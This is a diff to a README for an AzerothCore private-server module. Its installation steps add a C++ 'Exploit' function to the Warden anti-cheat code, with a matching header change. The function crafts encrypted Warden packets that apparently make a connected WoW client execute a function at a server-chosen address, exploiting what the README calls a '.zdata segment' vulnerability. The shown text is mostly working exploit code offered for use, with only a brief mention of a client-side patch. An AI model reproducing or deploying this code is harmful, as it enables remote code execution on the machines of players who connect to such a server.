@@ -13,17 +13,68 @@ This specific exploit can be prevented by patching your `WoW.exe` by making the 
 ![GIF](/.github/demo.gif)
 
 ## Module installation
-1. Modify the following file:
-```txt
-.\azerothcore-wotlk\src\server\game\Warden\WardenWin.cpp
+1. Modify the following files:
+```cpp
+.\azerothcore-wotlk\src\server\game\Warden\WardenWin.cpp:
+void WardenWin::Exploit(uint32 function) {
+    ByteBuffer moduleInit;
+    moduleInit << uint8(4);
+    moduleInit << uint8(0);
+    moduleInit << uint8(0);
+    moduleInit << function;
+    moduleInit << uint8(1);
+
+    ByteBuffer moduleInitFrameExecute;
+    moduleInitFrameExecute << uint8(4);
+    moduleInitFrameExecute << uint8(0);
+    moduleInitFrameExecute << uint8(0);
+    moduleInitFrameExecute << uint32(0x00419210);
+    moduleInitFrameExecute << uint8(1);
+
+    // Build check request
+    ByteBuffer buff;
+    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
+    buff << uint16(moduleInit.size());
+    buff << uint32(BuildChecksum(moduleInit.contents(), 8));
+    buff.append(moduleInit);
+
+    uint8 xorByte = _inputKey[0];
+    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
+    buff << uint8(0);
+    buff << uint8(TIMING_CHECK ^ xorByte);
+    buff << uint8(LUA_EVAL_CHECK ^ xorByte);
+    buff << uint8(1);
+    buff << uint8(xorByte);
+
+    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
+    buff << uint8(0);
+    buff << uint8(TIMING_CHECK ^ xorByte);
+    buff << uint8(xorByte);
+
+    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
+    buff << uint16(moduleInitFrameExecute.size());
+    buff << uint32(BuildChecksum(moduleInitFrameExecute.contents(), 8));
+    buff.append(moduleInitFrameExecute);
+
+    // Encrypt with warden RC4 key
+    EncryptData(buff.contents(), buff.size());
+
+    WorldPacket pkt(SMSG_WARDEN_DATA, buff.size());
+    pkt.append(buff);
+    _session->SendPacket(&pkt);
+}
 ```
 ```diff
-- Request.Function2 = 0x00419210;
-+ Request.Function2 = 0x009D1000;
+.\azerothcore-wotlk\src\server\game\Warden\WardenWin.h
+bool IsCheckInProgress() override;
+void ForceChecks() override;
+void HandleData(ByteBuffer& buff) override;
++ void Exploit(uint32 function);
 ```
+
 2.  Clone this module into the modules directory
 3.  Re-run cmake
-4.  Compile.
+4.  Compile
 
 # 1. Technical Writeup: .zdata Segment Vulnerability
 
